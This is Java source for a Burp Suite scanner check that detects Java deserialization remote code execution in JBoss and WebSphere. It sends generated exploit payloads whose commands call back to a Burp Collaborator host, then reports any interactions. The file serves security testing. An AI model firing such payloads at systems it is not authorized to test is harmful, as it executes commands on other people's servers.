/*
	CollaboratorScannerCheck.java
	
	v0.5 (11/22/2016)
	
	Active Scan check to detect Java Deserialization Remote Code Execution using the Burp Collaborator as the Node.
*/

package burp;

import java.util.Hashtable;
import java.util.List;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.Properties;
import java.io.OutputStream;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.net.URL;


public class CollaboratorScannerCheck extends SuperSerialScannerCheck {
	private IBurpCollaboratorClientContext collabClient;
	
	public CollaboratorScannerCheck(IBurpExtenderCallbacks cb) {
		super(cb);
		collabClient = callbacks.createBurpCollaboratorClientContext();
	}
	
	@Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue,IScanIssue newIssue) {
		return -1;
	}
	
	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,IScannerInsertionPoint insertionPoint) {
		List<IScanIssue> issues = null;
		
		String ipName = insertionPoint.getInsertionPointName();
		if(settings.getNodeCollaborator() && (ipName.equals(JBOSS_INSERTION_POINT) || ipName.equals(WEBSPHERE_INSERTION_POINT))) { //if Burp Collaborator is set as Node Type
			IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
			URL url = reqInfo.getUrl();
			String urlStr = url.getProtocol()+"://"+url.getHost()+":"+url.getPort()+url.getPath();
			int downloadTries = settings.getDownloadTries();
			int waitTime = settings.getWaitTime();
			
			Hashtable[] commands = pcf.getCommandsArray();
			if(commands.length==0) { //if command list is empty: print error (to Extender->Errors tab and Alerts) and quit
				callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid scan settings (command list is empty)! Add at least one command in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
				callbacks.issueAlert("Invalid SuperSerial scan settings: no commands to test! Active scan checks will be skipped! Add at least one command in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
				return issues;
			}
			
			String[] payloadTypes = ptf.getEnabledTypes();
			if(payloadTypes.length==0) { //if no payload types are enabled: print error (to Extender->Errors tab and Alerts) and quit
				callbacks.printError("Active Scans check skipped on "+urlStr+" due to invalid scan settings (no payload types enabled)! Enable at least one payload type in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
				callbacks.issueAlert("Invalid SuperSerial scan settings: no payload types enabled! Active scan checks will be skipped! Enable at least one payload type in the "+settings.getTabCaption()+"->\"Scan Settings\" tab!");
				return issues;
			}
			
			//loop through payload types and test commands
			for(int i=0;i<payloadTypes.length;i++) {
				for(int j=0;j<commands.length;j++) {
					String technique = payloadTypes[i];
					Hashtable cmdHT = commands[j];
					String cmd = (String) cmdHT.get("cmd");
					String collabLoc = collabClient.generatePayload(true);
					cmd = makeCommand(cmd,"http",collabLoc,80,"/","",technique); //TODO: Support Collaborator HTTPS
					//callbacks.printError(urlStr+":\n\tType: "+technique+"; cmd: "+cmd);
					
					//Request #1: create payload using current technique and collaborator location, and send to target host
					//callbacks.printError(urlStr+":\n\tType: "+technique+"; cmd: "+cmd);
					byte[] payload = generator.generatePayload(technique,cmd);
					if(payload.length==1) { //payload generation failed, move onto next command
						continue;
					}
					byte[] req = insertionPoint.buildRequest(payload);
					IHttpRequestResponse exploitRR = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),req);
					
					//create exploit request highlights (content-type (if applicable) and command), but do not apply until vuln is confirmed
					List<int[]> expReqHighlights = null;
					String param = null;
					String encoding = null;
					String platform = null;
					int cmdStart = helpers.indexOf(req,cmd.getBytes(),true,0,req.length); //check for clear-text command
					if(cmdStart>-1) {
						expReqHighlights = new ArrayList<int[]>(2);
						int ctStart = helpers.indexOf(req,JBossSerializedInsertionPoint.CONTENT_TYPE.getBytes(),true,0,req.length); //check for java-serialized-object content-type header
						if(ctStart>-1) {
							expReqHighlights.add(new int[] {ctStart,ctStart+JBossSerializedInsertionPoint.CONTENT_TYPE.length()});
						}
						expReqHighlights.add(new int[] {cmdStart,cmdStart+cmd.length()});
						platform = "JBoss";
					} else {
						String encodedPayload = helpers.base64Encode(payload);
						cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length); //check for base64-encoded payload object
						if(cmdStart>-1) {
							expReqHighlights = new ArrayList<int[]>(1);
							expReqHighlights.add(new int[] {cmdStart,cmdStart+encodedPayload.length()});
							platform = "WebSphere";
							encoding = "base64";
							param = insertionPoint.getBaseValue(); //get parameter name where payload is inserted after encoding
						} else {
							encodedPayload = helpers.urlEncode(encodedPayload);
							cmdStart = helpers.indexOf(req,encodedPayload.getBytes(),true,0,req.length);
							if(cmdStart>-1) {
								expReqHighlights = new ArrayList<int[]>(1);
								expReqHighlights.add(new int[] {cmdStart,cmdStart+encodedPayload.length()});
								platform = "WebSphere";
								encoding = "base64";
								param = insertionPoint.getBaseValue(); //get parameter name where payload is inserted after encoding
							} else { //other encoding methods can be added here (such as full URL-Encode)
								
							}
						}
					}
					expReqHighlights = sortHighlightIndexList(expReqHighlights); //ensure that request highlights list is sorted correctly
					
					//create exploit reponse highlight (server header), but do not apply unless vuln is confirmed
					List<int[]> expRespHighlights = null;
					IResponseInfo expRespInfo = helpers.analyzeResponse(exploitRR.getResponse());
					String serverHeader = null;
					int ind = -1;
					List<String> expRespHeaders = expRespInfo.getHeaders();
					Iterator<String> expRespHeadersItr = expRespHeaders.iterator();
					while(expRespHeadersItr.hasNext()) {
						String header = expRespHeadersItr.next();
						if(header!=null && header.contains(platform)) {
							ind = header.indexOf(platform);
							serverHeader = header.substring(ind);
							break;
						}
					}
					if(serverHeader!=null) {
						expRespHighlights = new ArrayList<int[]>(1);
						ind = helpers.indexOf(exploitRR.getResponse(),serverHeader.getBytes(),true,0,exploitRR.getResponse().length);
						if(ind>-1) {
							expRespHighlights.add(new int[] {ind,ind+serverHeader.length()});
						}
					}
					expRespHighlights = sortHighlightIndexList(expRespHighlights); //ensure that response highlights list is sorted correctly
					
					//Request #2: check for Collaborator interactions for current Collaborator location, check exactly "downloadTries" number of times
					int tryCount=0;
					ArrayList<IBurpCollaboratorInteraction> interList = new ArrayList<IBurpCollaboratorInteraction>();
					Iterator<IBurpCollaboratorInteraction> collabInterItr = null;
					while(tryCount<downloadTries) {
						try {
							Thread.sleep(waitTime);
						} catch(Exception e) {
							//don't care, wait time will not be used this time
						}
						List<IBurpCollaboratorInteraction> collabInter = collabClient.fetchCollaboratorInteractionsFor(collabLoc);
						if(collabInter.size()>0) { //if interaction(s) were found from the current poll request, add all to overall list and continue
							collabInterItr = collabInter.iterator();
							while(collabInterItr.hasNext()) {
								interList.add(collabInterItr.next());
							}
						}
						tryCount++;
					}
					
					if(interList.size()>0) { //if interaction(s) were found
						issues = new ArrayList<IScanIssue>(1);
						//callbacks.printOutput("Collaborator interaction forced on URL using "+technique+" payload type");
						
						//loop through retrieved Collaborator interactons and look for HTTP(S) interaction
						collabInterItr = interList.iterator();
						IBurpCollaboratorInteraction inter = null;
						boolean http = false;
						while(collabInterItr.hasNext()) {
							inter = collabInterItr.next();
							String type = inter.getProperty("type");
							if(type.equalsIgnoreCase("HTTP")) {
								http = true;
								break;
							}
						}
						
						if(http) { //HTTP(S) Collaborator interaction(s) found, report first one
							byte[] collabReq = helpers.base64Decode(inter.getProperty("request"));
							byte[] collabResp = helpers.base64Decode(inter.getProperty("response"));
							boolean uploaded = false;
							IHttpRequestResponse nodeRR = new HttpRequestResponseHelper(callbacks,collabReq,collabResp,collabLoc,80,false);
							
							//create Burp Collaborator request highlights (payload type (if applicable), collaborator host and downloaded file (if applicable))
							List<int[]> nodeReqHighlights = null;
							IRequestInfo collabReqInfo = helpers.analyzeRequest(collabReq);
							int techStart = helpers.indexOf(collabReq,technique.getBytes(),true,0,collabReq.length);
							if(techStart>-1) {
								nodeReqHighlights = new ArrayList<int[]>(3);
								nodeReqHighlights.add(new int[] {techStart,techStart+technique.length()});
							}
							int dataStart = collabReqInfo.getBodyOffset();
							cmdStart = helpers.indexOf(collabReq,collabLoc.getBytes(),true,0,collabReq.length);
							if(cmdStart>-1) {
								if(nodeReqHighlights==null) nodeReqHighlights = new ArrayList<int[]>(2);
								nodeReqHighlights.add(new int[] {cmdStart,cmdStart+collabLoc.length()});
							}
							if(dataStart<collabReq.length) {
								if(nodeReqHighlights==null) nodeReqHighlights = new ArrayList<int[]>(1);
								nodeReqHighlights.add(new int[] {dataStart,collabReq.length});
								uploaded = true;
							}
							nodeReqHighlights = sortHighlightIndexList(nodeReqHighlights); //ensure that request highlights list is ordered correctly
							
							//create Burp Collaborator response highlights
							List<int[]> nodeRespHighlights = null;
							IResponseInfo collabRespInfo = helpers.analyzeResponse(collabResp);
							List<String> collabRespHeaders = collabRespInfo.getHeaders();
							Iterator<String> headersItr = collabRespHeaders.iterator();
							while(headersItr.hasNext()) {
								String header = headersItr.next();
								String[] headerSplit = header.split(": ",2);
								if(headerSplit[0].trim().equals("Server") && headerSplit.length>1) {
									nodeRespHighlights = new ArrayList<int[]>(1);
									int headerStart = helpers.indexOf(collabResp,headerSplit[1].getBytes(),true,0,collabResp.length);
									nodeRespHighlights.add(new int[] {headerStart,headerStart+headerSplit[1].length()});
									break;
								}
							}
							nodeRespHighlights = sortHighlightIndexList(nodeRespHighlights); //ensure that response highlights list is ordered correctly
							
							//create highlighted requests/responses
							IHttpRequestResponseWithMarkers exploitRRWM = callbacks.applyMarkers(exploitRR,expReqHighlights,expRespHighlights);
							IHttpRequestResponseWithMarkers nodeRRWM = callbacks.applyMarkers(nodeRR,nodeReqHighlights,nodeRespHighlights);
							
							//create properties list for issue creation
							Properties issueDetailProps = new Properties();
							issueDetailProps.setProperty("node_type","Burp Collaborator");
							issueDetailProps.setProperty("node_location",collabLoc);
							issueDetailProps.setProperty("command",cmd);
							issueDetailProps.setProperty("technique",technique);
							issueDetailProps.setProperty("source",inter.getProperty("client_ip"));
							issueDetailProps.setProperty("time",inter.getProperty("time_stamp"));
							issueDetailProps.setProperty("platform",platform);
							issueDetailProps.setProperty("os",(String) cmdHT.get("os"));
							if(uploaded) {
								issueDetailProps.setProperty("upload1"," and upload a file to");
								issueDetailProps.setProperty("upload2"," containing a file");
							} else {
								issueDetailProps.setProperty("upload1","");
								issueDetailProps.setProperty("upload2","");
							}
							if(param!=null) issueDetailProps.setProperty("parameter",param);
							if(encoding!=null) issueDetailProps.setProperty("encoding",encoding);
							
							//check if payload was encoded, then create issue and quit
							if(encoding == null) { //payload not encoded
								BinaryPayloadIssue issue = new BinaryPayloadIssue(callbacks,exploitRRWM,nodeRRWM,issueDetailProps);
								issues.add(issue);
							} else { //payload encoded
								EncodedPayloadIssue issue = new EncodedPayloadIssue(callbacks,exploitRRWM,nodeRRWM,issueDetailProps);
								issues.add(issue);
							}
						} else { //only DNS Collaborator interaction(s) found, report first one
							callbacks.printOutput("Collaborator DNS interaction forced on URL using "+technique+" payload type");
						}
						return issues;
					}
				}
			}
		}
		return issues;
	}
}
